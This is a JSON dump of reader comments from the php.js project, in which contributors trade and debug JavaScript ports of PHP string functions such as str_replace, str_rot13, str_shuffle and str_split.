subject is an array, then the search and replace is \r\n\r\nperformed with every entry of subject , and the return value is an array as well.\r\n        for(k in subject){\r\n            subject[k]=str_replace(search,replace,subject[k]);\r\n        }\r\n        return subject;\r\n    }\r\n\r\n\r\n\r\n\r\nnumreplx=search.length;\r\nnumon=0;\r\nfincods=new Array();\r\nwhile(fincods.length&lt;numreplx)\r\n{\r\nnsub=subject;\r\nfor(x=0;x&lt;fincods.length;x++)\r\n{\r\nnsub=nsub.replace(new RegExp(regexp_escape(search[x]), &quot;g&quot;), &quot;[cod&quot;+fincods[x]+&quot;]&quot;);\r\n}\r\nfor(x=0;x&lt;fincods.length;x++)\r\n{\r\nnsub=nsub.replace(new RegExp(regexp_escape(&quot;[cod&quot;+fincods[x]+&quot;]&quot;), &quot;g&quot;), replace[x]);\r\n}\r\nif(nsub.indexOf(&quot;[cod&quot;+numon+&quot;]&quot;) == -1)\r\n{\r\nfincods[fincods.length]=numon;\r\n}\r\nnumon++;\r\n}\r\nfor(x=0;x&lt;fincods.length;x++)\r\n{\r\nsubject=subject.replace(new RegExp(regexp_escape(search[x]), &quot;g&quot;), &quot;[cod&quot;+fincods[x]+&quot;]&quot;);\r\n}\r\nfor(x=0;x&lt;fincods.length;x++)\r\n{\r\nsubject=subject.replace(new RegExp(regexp_escape(&quot;[cod&quot;+fincods[x]+&quot;]&quot;), &quot;g&quot;), replace[x]);\r\n}\r\nreturn subject;\r\n}[\/CODE]"},{"date":"2008-03-31 17:16:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip: A seemingly straightforward function like str_replace turns out to be more complex than e.g. mktime :) I've indented your code and included the extra function (had to 'var' it for namespacing compatibility) in str_replace.\r\n\r\nThanks A LOT for seriously improving this function!"},{"date":"2008-03-31 17:20:52","author":"Philip","url":"","comment":"No problem!\r\n\r\nAlso:  Credits to Simon Willison (http:\/\/simonwillison.net\/2006\/Jan\/20\/escape\/) for the regexp_escape function."},{"date":"2008-03-31 17:31:45","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip: Cool, I've included Simon as well. Thanks again."},{"date":"2008-04-12 17:23:37","author":"Jonas Raoni","url":"","comment":"For the str_replace the best and fastest method I know it's:\r\n\r\n&quot;Jonas Raoni&quot;.split(&quot;a&quot;).join(&quot;X&quot;);"},{"date":"2008-04-13 12:20:22","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: Hi there, how have you been? Thats a brutal approach :) However the long code we have now supports some features that your approach does not. For more information see the comments here. Thanks for this insightful way though!"},{"date":"2008-04-15 08:47:18","author":"Philip Peterson","url":"","comment":"Hmm, I actually can see where that could come in useful though...\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\nnsub = nsub.replace(new RegExp(__regexp_escape(search[x]), &quot;g&quot;), &quot;[cod&quot;+fincods[x]+&quot;]&quot;);\r\n\r\ncould work with\r\n\r\nnsub = nsub.split(search[x]).join(&quot;[cod&quot;+fincods[x]+&quot;]&quot;);\r\n[\/CODE]\r\n\r\nand that sort of thing occurs in four places, so there's a significant drop in size, and you probably can even drop that __regexp_escape function [sorry Simon :(].  You probably should keep him in the credits though, even if you take the function out."},{"date":"2008-04-15 09:03:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Philip Peterson: If you like you can now do this in SVN ;)"},{"date":"2008-04-17 06:05:09","author":"Jonas Raoni","url":"","comment":"I just made this code, it's using the already present is_array function.\r\n\r\nfunction str_replace(f, r, s){\r\n\tvar ra = is_array(r), sa = is_array(s), f = [].concat(f), r = [].concat(r), i = (s = [].concat(s)).length;\r\n\twhile(j = 0, i--)\r\n\t\twhile(s[i] = s[i].split(f[j]).join(ra ? r[j] || &quot;&quot; : r[0]), ++j in f);\r\n\treturn sa ? s : s[0];\r\n}\r\n\r\nExample:\r\n\r\nalert(str_replace([&quot;a&quot;, &quot;fb&quot;, &quot;c&quot;], [&quot;f&quot;, &quot;g&quot;], [&quot;abcd&quot;]));"},{"date":"2008-04-17 13:03:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: That looks very promising :) I still have to test it but if you have reduced our function to this, preserving all of it's functionality, then you deserve 3 medals ;)"},{"date":"2008-04-17 13:49:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jonas Raoni: I've updated, committed, generated, deployed, tested, reverted, commited, generated &amp; deployed ;)\r\n\r\nAnd srry dude but your str_replace did not survive Peter's testcase:\r\n[CODE=&quot;Javascript&quot;]\r\n\/\/ should return: hello, mars\r\nstr_replace(['{name}', 'l'], ['hello', 'm'], '{name}, lars');\r\n[\/CODE]\r\n\r\nMore info in the comments here.\r\nGuess I'll be needing those medals back ;) nah just kidding :)"},{"date":"2008-04-18 02:03:15","author":"Philip Peterson","url":"","comment":"Wow... bravo is all I can say... that's more than 20x faster than my code, too, lol..."},{"date":"2008-04-18 02:05:20","author":"Philip Peterson","url":"","comment":"Woah, I didn't see comments #16 or #15... hmm, I'm surprised, it definitely has merit, though..."},{"date":"2008-04-18 04:06:47","author":"Jonas Raoni","url":"","comment":"I didn't looked the comments before, I just saw the code was long and made a version :)~\r\n\r\nBut it's strange... What php version are you using? The following code, on php 5, gave me as output &quot;hemmo, mars&quot;:\r\n\r\necho str_replace(array('{name}', 'l'), array('hello', 'm'), '{name}, lars');"},{"date":"2008-04-18 05:31:00","author":"Philip","url":"","comment":"That is incredibly weird... I was certain that PHP replaced all the stuff at once so as not to create overlap... ah well, I guess it's not like that after all.  It was a cool function though :P"},{"date":"2008-04-18 08:21:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@  Jonas Raoni: That's astonishing :D The non-overlapping approach was convincing enough for me not to take the effort to test if this was the actual mechanism of PHP. It would make sense though right? Anyway, I will reinstate your version Jonas Raoni, and adjust the test case. Thanks for all of your work! You too Peter, some functions come easy, some tend to be a little of a pain. But that's the challenge &amp; learning experience, right."},{"date":"2008-09-25 05:37:12","author":"Anton Ongsono","url":"www.callrid.com","comment":"i have try to use this, but i five me error in FF 2 :  \r\n[CODE=&quot;text&quot;]\r\ns[i] has no properties\r\n[Break on this error] while (s[i] = s[i].split(f[j])....in(ra ? r[j] || &quot;&quot; : r[0]), ++j in f){};\r\n[\/CODE]\r\n\r\nso that i tried to fixed like this :\r\n[CODE=&quot;Javascript&quot;]\r\nfunction str_replace(search, replace, subject) { \r\n    var f = search, r = replace, s = subject;\r\n    var ra = is_array(r), sa = is_array(s), f = [].concat(f), r = [].concat(r), i = (s = [].concat(s)).length;\r\n \r\n    while (j = 0, i--) {\r\n\t\tif (s[i])\r\n\t\t{\r\n        \twhile (s[i] = s[i].split(f[j]).join(ra ? r[j] || &quot;&quot; : r[0]), ++j in f){};\r\n\t\t}\r\n    };\r\n     \r\n    return sa ? s : s[0];\r\n}\r\n[\/CODE]"},{"date":"2008-09-25 05:40:09","author":"Anton Ongsono","url":"http:\/\/www.callrid.com","comment":"i have try to use this, but i five me error in FF 2.0.0.16 :\r\n[CODE=&quot;text&quot;]\r\ns[i] has no properties\r\n[Break on this error] while (s[i] = s[i].split(f[j])....in(ra ? r[j] || &quot;&quot; : r[0]), ++j in f){};\r\n[\/CODE]\r\nso that i tried to fixed like this :\r\n[CODE=&quot;Javascript&quot;]\r\nfunction str_replace(search, replace, subject) { \r\n    var f = search, r = replace, s = subject;\r\n    var ra = is_array(r), sa = is_array(s), f = [].concat(f), r = [].concat(r), i = (s = [].concat(s)).length;\r\n \r\n    while (j = 0, i--) {\r\n    if (s[i])\r\n    {\r\n          while (s[i] = s[i].split(f[j]).join(ra ? r[j] || &quot;&quot; : r[0]), ++j in f){};\r\n    };\r\n    };\r\n     \r\n    return sa ? s : s[0];\r\n}\r\n[\/CODE]"},{"date":"2008-09-25 14:35:54","author":"Onno Marsman","url":"","comment":"Why be dependant on is_array when you could just use &quot;instanceof Array&quot; ? This probably saves a bit of performance too."},{"date":"2008-09-29 12:26:31","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno &amp; Anton: Both excellent points. Function updated. Thank you!"},{"date":"2008-11-26 18:59:50","author":"T.Wild","url":"","comment":"I think the following line should should probably be changed from:\r\n[CODE=&quot;Javascript&quot;]\r\nvar f = search, r = replace, s = subject;\r\n[\/CODE]\r\nTO\r\n[CODE=&quot;Javascript&quot;]\r\nvar f = search+'', r = replace+'', s = subject+'';\r\n[\/CODE]\r\n\r\nFound this problem (if anyone is interested) when trying:\r\n[CODE=&quot;Javascript&quot;]\r\nstr_replace(&quot;foo&quot;,&quot;baa&quot;,location);\r\n\/\/You get the same problem with\r\nstr_replace(34,9,123456);\r\n[\/CODE]"},{"date":"2008-11-26 21:34:10","author":"T.Wild","url":"","comment":"OOPS, I leaped before I looked at the code properly, this may be a better idea but I'm not the best JavaScript programmer in the world.\r\n[CODE=&quot;Javascript&quot;]\r\n    var f = search, r = replace, s = subject;\r\n\r\n    var ra = r instanceof Array, sa = s instanceof Array, f = [].concat(f), r = [].concat(r), i = (s = [].concat(s)).length;\r\n\r\n    if(!ra){r+='';}\r\n    if(!sa){s+='';}\r\n    if(!(f instanceof Array)){f+='';}\r\n[\/CODE]"},{"date":"2008-11-26 21:51:10","author":"Onno Marsman","url":"","comment":"T.Wild: I don't have time for testing right now but doesn't the following do the trick a bit better?\r\nWhen you do pass an array you'd also want every element to be a string.\r\nI don't see any need to convert r to string(s), but I could be wrong. I find the code a bit hard to read.\r\nWhy the whole variable name replacement thing anyway? I thought we have a compiler to do this. This only results in more code after compilation.\r\n\r\n \r\n[CODE=&quot;Javascript&quot;]\r\nwhile (s[i] = (s[i]+'').split(f[j]).join(ra ? r[j] || &quot;&quot; : r[0]), ++j in f){};\r\n[\/CODE]"},{"date":"2008-11-26 21:54:22","author":"Onno Marsman","url":"","comment":"To be clear: I've only changed the s[i] to (s[i]+'') in that line."},{"date":"2008-11-26 23:15:25","author":"T.Wild","url":"","comment":"IN REPLY TO Onno Marsman.\r\nAs I said 'I'm not the best JavaScript programmer in the world.' and what I submitted worked for me (well, almost, r+='' should have been r = r+'' etc) in my limited tests, and I was having trouble seeing what the original code was doing anyway - I don't particularly  like the shorthand ways of writing ifs etc - that's why I converted s,r and f to strings to be sure.\r\n\r\nYour code fix works fine and sorry for the trouble."},{"date":"2008-11-27 18:39:30","author":"Onno Marsman","url":"","comment":"No trouble at all! I guess you've misunderstood me. Like I said I also don't like that whole shorthand stuff. It's very hard to read indeed."},{"date":"2008-12-01 08:41:55","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman &amp; T. Wild: It's not my preferred coding style either, we may need to refactor it some day so it will be more consistent to other code found in php.js"},{"date":"2009-01-22 12:29:55","author":"acimeha","url":"","comment":"hi there !\r\nconsider this as solution for str_replace\r\n\r\nstr = str.replace(new RegExp(&quot;\\n\\r&quot;, 'gi'), &quot;\\n&quot;);\r\n\r\n\r\nbest regards"},{"date":"2009-01-22 13:05:12","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"acimeha, yes, using the native JavaScript replace works fine for most cases, but this project aims to support PHP's behavior, which also allows arrays as inputs."},{"date":"2009-01-30 09:16:49","author":"jonze","url":"","comment":"hello and congratulations for this article(and script also). I needed something like str_replace from php very fast done with javscript and seems that your script does that very well!\r\n\r\nRegards!"},{"date":"2009-02-20 12:06:38","author":"avel","url":"http:\/\/www.qespai.com\/sincronia","comment":"Thanks a lot for this blog. Is really usefull.\r\n\r\ni'm from Barcelona and i'm a baby php programer and this php.js library look like so good.\r\n\r\nnote: my website is nearly in net."},{"date":"2009-02-21 12:49:05","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ avel: Be sure to checkout http:\/\/phpjs.org, I'm making some progress there."},{"date":"2009-05-04 11:33:30","author":"Oleg Eremeev","url":"","comment":" Hello. I downloaded yesterday php.full.js. Library is very good, thank you for proceeding. But I tried to use str_replace function. It works not properly. Function replaces all items of search array with first item of replace array found in subject string. I wrote modified function:\n\n[CODE]\nfunction str_replace(search, replace, subject) {\n    var s = subject;\n    var f = [].concat(search);\n    var r = [].concat(replace);\n    var l = (f.length>r.length) ? r.length : f.length;\n    var i = 0;\n\t\n    for (i=0; i<l; ++i)\n    {\n        s = s.split(f[i]).join(r[i]);\n    }\n\t\n    return s;\n}\n[\/CODE]\n\nThis one do all I want. I hope it is useful, but I am not sure is it correct.\n\nSorry for my bad English, I am schoolboy from Latvia. "},{"date":"2009-05-04 11:36:14","author":"Oleg Eremeev","url":"","comment":"In previous post something wrong.\n\n[CODE]\nfunction str_replace(search, replace, subject) {\nvar s = subject;\nvar f = [].concat(search);\nvar r = [].concat(replace);\nvar l = (f.length>r.length) ? r.length : f.length;\nvar i = 0;\n\nfor (i=0; i<l; ++i)\n{\n\ts = s.split(f[i]).join(r[i]);\n}\n\nreturn s;\n}\n[\/CODE]"},{"date":"2009-05-04 11:37:25","author":"Oleg Eremeev","url":"","comment":"Why Code is uploading not correctly???"},{"date":"2009-05-04 15:41:01","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Oleg,\n\nThanks for pointing out the bug... There was also a bug in handling the subject as an array. Should be fixed in SVN now. I think I might have also fixed the comments.\n\nBtw, we can't just use the shorter length since the PHP behavior is to allow a longer search array to have extra items be replaced by the empty string (i.e., the extra items do get replaced (removed)).\n\nI also added the count param..."},{"date":"2009-05-04 18:59:06","author":"Oleg Eremeev","url":"","comment":"Hi Brett,\n\nMy code can convert extra items to empty strings too:[CODE]\nfunction str_replace(search, replace, subject) {\n    var s = subject;\n    var f = [].concat(search);\n    var r = [].concat(replace);\n    var l = f.length;\n    var i = 0;\n\t\n    for (i=0; i<l; ++i)\n    {\n        s = s.split(f[i]).join((r[i]!=undefined)?r[i]:'');\n    }\n\t\n    return s;\n}\n[CODE]But I forgot about count param. It's more difficult. Anyway, I don't want it. :)"},{"date":"2009-05-05 01:50:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"See my changes at http:\/\/trac.phpjs.org\/projects\/phpjs\/browser\/trunk\/functions\/strings\/str_replace.js . I've tested all the PHP examples, and they are all working. Note that count must be in string form, and must out of necessity reference a global."},{"date":"2009-05-05 17:28:55","author":"Oleg Eremeev","url":"","comment":"Ok. Good job, the function is written very correctly. :) \nBut why:\n[...for (i=s.length-1; i >= 0; i--) {...]\nnot:\n[...for (i=0; i <= s.length-1; i++) {...]\n??? String-array will be parsed from right to left? I don't know PHP function specification, but I think count param is used to count affected symbols from left to right, it's more useful. Am I right?"},{"date":"2009-05-05 19:44:59","author":"Oleg Eremeev","url":"","comment":"Oh, sorry! I have read the documentation on php.net. I thought count param limits count of replaces, but it only counts replaces. I wrote a complete delusion, sorry. :)"},{"date":"2009-05-06 00:57:45","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"@Oleg, as far as why the loop goes down, there is no good reason, except that I was kind of following the pattern that was there previously. :)  I changed it to an ascending loop to follow convention and not raise the same question for others. I also optimized the for loops a little by checking for the length at the beginning of the loop instead of upon each iteration. Thanks!"},{"date":"2009-05-07 20:53:27","author":"Oleg Eremeev","url":"","comment":"I am happy to help you! ;)"},{"date":"2009-05-07 20:59:38","author":"Oleg Eremeev","url":"","comment":"You forgot to change i-- in for() loop to i++ (or ++i - no difference :) )."},{"date":"2009-05-08 00:38:38","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ouch! Thanks!  I fixed that, and also had a bug in the next for loop initialization. Ok now in SVN... Thanks again..."},{"date":"2009-08-10 14:43:44","author":"Erik","url":"erikpoehler.com","comment":"One question: JSLint complains about\n[CODE]while (j = 0, i--) {\nProblem at line 50 character 17: Expected ')' to match '(' from line 50 and instead saw ','.[\/CODE]\n\n\nAny idea how to fix this and the resulting errors in JSLint? Much appreciated!"},{"date":"2009-08-10 16:06:16","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Erik: Just use the latest version here now; I recall the code had some buggy behavior, so it was fixed not too long ago."},{"date":"2009-08-12 14:25:58","author":"Max","url":"http:\/\/www.so-bitter.com\/","comment":"Why do you use such a complicated function?\nI have this one in use and it works fine:\n\n[CODE]\nfunction str_replace(search, replace, subject) {\n    return subject.split(search).join(replace);\n}\n[\/CODE]"},{"date":"2009-08-16 15:41:40","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Max: It has to do with speed & PHP compliance. Your function will produce different results from PHP's in some cases. Among things, this has to do with Philip's comment from 30 Mar '08"},{"date":"2010-09-06 16:16:17","author":"Iosif","url":"","comment":"[CODE]\nfunction str_replace(search, replace, subject)\n{\n\tif(is_array(search)) \n\t{\n\t\tif(is_array(replace))\n\t\t{\n\t\t\tfor(i in search)\n\t\t\t{\n\t\t\t\tsubject = subject.split(search[i]).join(replace[i]);\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor(i in search)\n\t\t\t{\n\t\t\t\tsubject = subject.split(search[i]).join(replace);\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tsubject = subject.split(search).join(replace);\n\t}\n\n    return subject;\n}\n[\/CODE]"},{"date":"2010-09-06 16:17:44","author":"Iosif","url":"","comment":"[CODE}\nfunction is_array(obj) \n{\n\tif (obj.constructor.toString().indexOf(\"Array\") == -1)\n\t\treturn false;\n\telse\n\t\treturn true;\n}\n[\/CODE]"},{"date":"2010-09-08 19:53:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ losif:  Your str_replace will produce different results from PHP's in some cases. Among things, this has to do with Philip's comment from 30 Mar '08\n\nAs for your is_array, we also want it to return true for associative arrays (which we use JavaScript objects for). So just testing for the Array constructor wil fail for:\n\nnames['first'] = 'losif';\n[CODE]\nif (is_array(names)) {\n    \/\/ Won't reach. names is an object in JavaScript terms.\n}\n[\/CODE]"},{"date":"2010-10-31 21:11:45","author":"Ghabriel Nunes","url":"","comment":"Hi, I did make a preg_replace() function (it have the parameters: pattern, replacement, subject, limit) that doesn't use the eval() function (so it's better in terms of performance). I don't know if here is the right place, but I'll post it:\n\nExample 1: preg_replace(\/Kevin\/,'','Kevin Kevin van Zonneveld')\nReturns 1: 'van Zonneveld'\n\nExample 2: preg_replace(\/Kevin\/,'','Kevin Kevin van Zonneveld',1)\nReturns 2: 'Kevin van Zonneveld'\n\n\n[CODE]\nfunction preg_replace(pattern,replacement,subject,limit){\n\t\n\tif (subject.match(pattern) == null){\n\t\treturn subject;\n\t} else {\n\t\tif (!limit){\n\t\t\tp = pattern + '', m = '';\n\t\t\tif (p.match(\/\\\/([^\/]*)\\\/i\/) != null){\n\t\t\t\tm = 'i';\n\t\t\t}\n\t\t\tp = p.replace(\/\\\/\/g,'').replace(m,'');\n\t\n\t\t\tp = new RegExp(p,(m + 'g'));\n\t\t\tpattern = p;\n\t\t\t\n\t\t\treturn subject.replace(pattern,replacement);\n\t\t} else {\n\t\t\tfor (i = 0; i < limit; i++){\n\t\t\t\tsubject = subject.replace(pattern,replacement);\n\t\t\t}\n\t\t\treturn subject;\n\t\t}\n\t}\n}\n[\/CODE]\n\n"},{"date":"2010-11-01 02:28:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ghabriel Nunes: Thanks for submitting. If you go to our functions page and see the link to the missing functions (at http:\/\/phpjs.org\/unported\/index ), you can see functions like preg_replace which may have already been implemented in some form (or just go to Github directly). I'm kind of holding off on doing much with these, personally speaking, until we (or someone) will incorporate the powerful XRegExp.com code into these preg_* functions. And you can see http:\/\/github.com\/kvz\/phpjs\/blob\/master\/_workbench\/pcre\/preg_match.js for a skeleton of how I'd hoped we could eventually implement other PHP regex features not even supported yet in XRegExp: http:\/\/github.com\/kvz\/phpjs\/blob\/master\/_workbench\/pcre\/preg_match.js . (Basically PHP regex has a lot more we'd like to see made available than JavaScript allows natively, so it's a bit of work to really get it working closer to that reality.)\n\n@Kevin: Seems the site has lost cookies now for a while. An easy way to put that back? Also, btw, it seems like your site is now unavailable from China without a proxy because one of the scripts is loading bit.ly content apparently."},{"date":"2010-11-01 19:41:00","author":"Ghabriel Nunes","url":"","comment":"So, I need to go to somewhere to post my function or someone will do it for me?"},{"date":"2010-11-02 03:45:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Ghabriel: Normally, you can leave comments on the \"Add Function\" page as you did or if it is a modification, you can leave it on the relevant function's page. \n\nBut in this case, my point is that our existing code in our \"workbench\" nor your code adequately meets our requirement of matching PHP behavior as closely as possible so we are not intending to release anything publicly until it meets the requirements I mentioned. We thank you for offering though, and you're welcome to try to meet the conditions I mentioned, but it would require quite a bit of JavaScript knowledge (and effort) in this case.\n"},{"date":"2010-12-10 02:51:10","author":"bajick","url":"www.bolitbajick.com","comment":"Thank you so much! Nice work!"},{"date":"2011-01-22 00:28:34","author":"Oziam","url":"","comment":"This is my equivalent to PHP str_ireplace, it will search a given string for bad characters contained in an Array and replace if found. It will strip ALL upper & lowercase instances from string.\r\n\r\n[CODE]\r\n\/\/ Author: Oziam\r\n\r\nfunction str_ireplace(str){\r\nvar bad = new Array('cc:','to:','content-type','href','\\\\n+','\\\\r+','\\\\t+','%0a+','%0d+','%08+','%09+');\r\nvar replace = \"\";\r\nvar result = \"\";\r\nvar x;\r\nvar  oldi = 0;\r\nfor (x in bad){\r\nfor (i = str.toLowerCase().indexOf(bad[x]); i > -1; i = str.toLowerCase().indexOf(bad[x],i)){\r\nresult += str.substring(oldi,i);\r\nresult += replace;\r\ni += bad[x].length;\r\noldi = i;}\r\n}\r\nreturn result+str.substring(oldi,str.length);\r\n}\r\n[\/CODE]\r\n\r\nUsage:\r\n====\r\n\r\nvar string = \"Send to: cc: bcc: etc.....\";\r\n\r\nstr_ireplace(string);\r\n\r\nreturns;\r\n\r\nSend   etc....."},{"date":"2011-09-01 19:35:12","author":"Al Newmann","url":"","comment":"For the very basic functionallity of the str_replace() function as shown in Example 1 there are two way easier and shorter solutions:\n\n1) [CODE]\n     var cadena = \"Cry%20of%20the%20Black%20Birds\";\n     cadena.split(\"%20\").join(\" \");\n     \/\/ result : cadena == \"Cry of the Black Birds\"\n    [\/CODE]\n\n2) [CODE]\n     var cadena = \"Cry%20of%20the%20Black%20Birds\";\n     cadena.replaceAll(\"%20\",\" \");\n     \/\/ result : cadena == \"Cry of the Black Birds\"\n    [\/CODE]\n\nThe code shown in the OP is very good and covers the whole functionallity of the str_replace() function, but if you are only looking for the basic of it, maybe you want to try these out.\n\nAl."},{"date":"2011-11-07 02:00:49","author":"Michal","url":"","comment":"If you like short scripts, use this modified function working same as one in PHP:\n[code]\nfunction str_replace (f, r, s) {f=[].concat(f), r=[].concat(r); for(var i in f){s=s.split(f[i]).join(r[r[i]!=undefined?i:0]);} return s;}\n[\/code]\nNote: it is evident f is search, r is replace and s is subject.\nEnjoy!"},{"date":"2012-07-05 11:15:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Michal: Thanks--If you have any way to shorten the existing function, without losing support for all the existing arguments and functionality, let us know. "},{"date":"2012-08-30 13:07:44","author":"zany","url":"","comment":"Thanks man you have solved my problem. :)"}],"str_rot13":[{"date":"2008-01-22 21:11:54","author":"Ates Goral","url":"","comment":"Alternative implementation that doesn't use conditionals:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction str_rot13(str) {\r\n    \/\/ *     example 1: str_rot13(&quot;Hello World!&quot;);\r\n    \/\/ *     returns 1: &quot;Uryyb Jbeyq!&quot;\r\n    \/\/ *     example 2: str_rot13(str_rot13(&quot;Hello World!&quot;));\r\n    \/\/ *     returns 2: &quot;Hello World!&quot;\r\n    \r\n\treturn str.replace(\/[A-Za-z]\/g, function (c) { return String.fromCharCode((((c = c.charCodeAt(0)) &amp; 223) - 52) % 26 + (c &amp; 32) + 65); });\r\n}\r\n[\/CODE]"},{"date":"2008-01-22 21:58:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Ates Goral: I agree, it's purdy ;)"},{"date":"2009-07-30 10:14:00","author":"Eric","url":"","comment":"Great!, only like 3 lines of code, I like this alot and its just what I'm looking for. Why on earth is this page not listed on Google for #1 spot of \"rot13 javascript\"?, on Google all I could find where old rot13 implementations that has like 40 lines of code written years ago using schemes for javascript 1.0. Glad I found this website! Thanks alot.\n\n"},{"date":"2009-07-30 13:58:04","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Not sure why it didn't make it, though at least str_rot13 with or without JavaScript made it to the first page. Thanks to your prompting, I went ahead and did a little further SEO investigation of the site and sent the recommendations to Kevin (though he's already done a fine job of bringing his site to sometimes even rival the PHP site when you search for PHP functions)"},{"date":"2009-08-04 12:32:33","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Eric & Brett Zamir: Both sites (php.js & my blog) have a pagerank of 5 currently. I guess it's just a matter of time for PHP.JS to receive more backlinks from other sites & get a higher ranking for people who want to find our javascript snippets."},{"date":"2010-04-23 09:18:06","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"My proposition (uses the conditional operator)\n\n[CODE]function rot13(x){ \n   return x.replace(\/[a-z]\/gi,function(s){ \n      return String.fromCharCode(s.charCodeAt(0)+(s.toLowerCase()<'n'?13:-13))}) \n}[\/CODE]"},{"date":"2010-04-23 11:24:21","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: Excellent work! Tests pass, we fixes jslint issue, and and function is tighter. Thanks a lot!\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/f4fcf895c16ecce83550efc9c190c82ed118c06c"},{"date":"2010-04-23 11:24:37","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: Excellent work! Tests pass, we fixes jslint issue, and and function is tighter. Thanks a lot!\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/f4fcf895c16ecce83550efc9c190c82ed118c06c"},{"date":"2010-04-23 11:35:31","author":"Rafa? Kukawski","url":"http:\/\/blog.kukawski.pl","comment":"I forgot to cast the input value to string, please change\n[CODE]str.replace(\/[a-z]\/gi [\/CODE]\nto [CODE](str + '').replace(\/[a-z]\/gi[\/CODE]\nI think it's important."},{"date":"2010-04-23 11:43:52","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Rafa\u0142 Kukawski: It is, thanks!\nhttp:\/\/github.com\/kvz\/phpjs\/commit\/0341548f49543d24a4f33f3261f5d844c3e12bbb"},{"date":"2012-04-23 14:48:44","author":"????? ????? ???","url":"http:\/\/an3m1.com\/","comment":"I agree it is a very informative article and I actually enjoy reading good stuff unlike all the crap out there on the internet  \n"}],"str_shuffle":[{"date":"2010-06-20 16:05:00","author":"Hans B PUFAL","url":"","comment":"[CODE]\nfunction str_shuffle (str) {\n    \/\/ http:\/\/kevin.vanzonneveld.net\n    \/\/ +   original by: Brett Zamir (http:\/\/brett-zamir.me)\n    \/\/ *     example 1: shuffled = str_shuffle(\"abcdef\");\n    \/\/ *     results 1: shuffled.length == 6\n\n    var newStr = [];\n    \n    if (arguments.length < 1) {\n        throw 'str_shuffle : Parameter str not specified';\n    }\n        \n    if (typeof str !== 'string') {\n        throw 'str_shuffle : Parameter str ( = ' + str + ') is not a string';\n    }\n    \n    str = str.split (''); \n    while (str.length) {\n        newStr.push (str.splice (Math.floor (Math.random () * (str.length - 1)) , 1)[0]);\n    }\n    \n    return newStr.join ('');\n}\n[\/CODE]\n\nIn my version (above) I check the argument type explicitly (simply checking for undefined does not ensure that a parameter was passed nor that it is a string). I also provide the actual parameter value in the exception since this usually makes debugging much easier.\n\nPerhaps php.js could adopt a standard in this area.\n\nI use array splice to extract the random character from str (which is split into a character array) which returns the extracted character to be added to newStr. This means that the rand variable is no longer needed. Putting getRandInt inline saves time and characters.\n\nFinally newStr is built in an array and converted at the return since (for long strings) this is more efficient than the str +=  char construct.\n\n"},{"date":"2010-06-20 18:56:21","author":"Hans B PUFAL","url":"","comment":"On reviewing the code I note an error \nthe line \n[CODE]\nnewStr.push (str.splice (Math.floor (Math.random () * (str.length - 1)) , 1)[0]);\n[\/CODE]\nshould read\n[CODE]\nnewStr.push (str.splice (Math.floor (Math.random () * (str.length)) , 1)[0]);\n[\/CODE]\n"}],"str_split":[{"date":"2008-04-30 16:32:31","author":"Brett Zamir","url":"","comment":"While the &quot;f_backwards&quot; argument might not do any harm, I prefer not to add distinctions not present in PHP, if for nothing else than if PHP changes later (of course it can be ignored here for now, but...)\r\n\r\nHowever, one additional change in my own version below which I added and think yours should to is to   allow a default of 1 for length (as in PHP):\r\n\r\n[CODE=&quot;Javascript&quot;]function str_split ( f_string, f_split_length){\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +     original by: Martijn Wieringa\r\n    \/\/ *         example 1: str_split('Hello Friend', 3);\r\n    \/\/ *         returns 1: ['Hel', 'lo ', 'Fri', 'end']\r\n \r\n    if (f_split_length == undefined) {\r\n        f_split_length = 1;\r\n    }\r\n    if(f_split_length &gt; 0){\r\n        var result = [];\r\n        while(f_string.length &gt; f_split_length) {\r\n            result[result.length] = f_string.substring(0, f_split_length);\r\n            f_string = f_string.substring(f_split_length);\r\n        }\r\n        result[result.length] = f_string;\r\n        return result;\r\n    }\r\n    return false;\r\n}[\/CODE]"},{"date":"2008-05-02 11:46:44","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett 